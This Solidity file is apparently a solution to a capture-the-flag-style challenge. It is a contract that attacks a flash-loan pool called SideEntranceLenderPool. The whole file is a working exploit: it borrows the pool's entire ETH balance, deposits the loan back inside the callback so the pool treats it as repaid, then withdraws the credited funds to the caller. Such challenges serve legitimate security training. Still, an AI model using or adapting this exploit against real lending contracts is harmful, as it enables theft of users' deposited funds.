// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.0;
import "./SideEntranceLenderPool.sol";

/**
 * @title SideEntranceLenderAttacker
 * @author MJ
 * @notice A contract that attacks SideEntranceLenderPool.
 */
contract SideEntranceLenderAttacker is IFlashLoanEtherReceiver {
    SideEntranceLenderPool public pool;

    constructor(address _pool) {
        pool = SideEntranceLenderPool(_pool);
    }

    function execute() external payable override {
      pool.deposit{value: msg.value}();
    }

    /**
     * @notice Attack the SideEntranceLenderPool contract.
     * @dev The attack is simple: flash loan a large amount of ETH from the pool, and have the `execute` callback function
     * deposit the ETH back into the pool. The pool's `withdraw` function will then be called, and the attacker will
     * receive the ETH that was deposited.
     */
    function attack() external {
      pool.flashLoan(address(pool).balance);
      pool.withdraw();
      SafeTransferLib.safeTransferETH(msg.sender, address(this).balance);
    }

    receive() external payable {}
}